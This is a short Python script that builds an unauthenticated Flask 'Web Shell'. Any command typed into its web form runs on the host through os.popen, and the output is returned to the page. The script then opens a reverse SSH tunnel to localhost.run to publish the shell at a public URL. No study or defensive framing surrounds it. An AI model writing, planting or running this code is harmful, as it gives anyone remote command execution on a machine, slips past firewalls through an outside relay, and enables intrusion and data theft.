
import os
import subprocess
from flask import Flask, request, render_template_string

# Initialize Flask app
app = Flask(__name__)

# HTML template for the web interface
HTML_TEMPLATE = """
<!doctype html>
<title>Web Shell</title>
<h1>Web Shell</h1>
<form method=post>
  <input type=text name=command placeholder="Enter command">
  <input type=submit value=Execute>
</form>
<pre>{{ output }}</pre>
"""

# Flask route to handle requests
@app.route("/", methods=["GET", "POST"])
def index():
    output = ""
    if request.method == "POST":
        command = request.form.get("command")
        if command:
            output = os.popen(command).read()
    return render_template_string(HTML_TEMPLATE, output=output)

# Function to start the Flask app and SSH tunnel
def start_server():
    # Start Flask app in a separate process
    flask_process = subprocess.Popen(["python", "-m", "flask", "run", "--host=0.0.0.0", "--port=5000"], env={**os.environ, "FLASK_APP": __file__})

    # Start SSH tunnel to localhost.run
    ssh_tunnel_command = "ssh -R 80:localhost:5000 localhost.run"
    with subprocess.Popen(ssh_tunnel_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) as proc:
        try:
            for line in proc.stdout:
                line = line.decode().strip()
                if "http" in line:
                    print(f"Access your web shell at: {line}")
        except KeyboardInterrupt:
            print("\nShutting down...")
            proc.terminate()
            flask_process.terminate()

if __name__ == "__main__":
    start_server()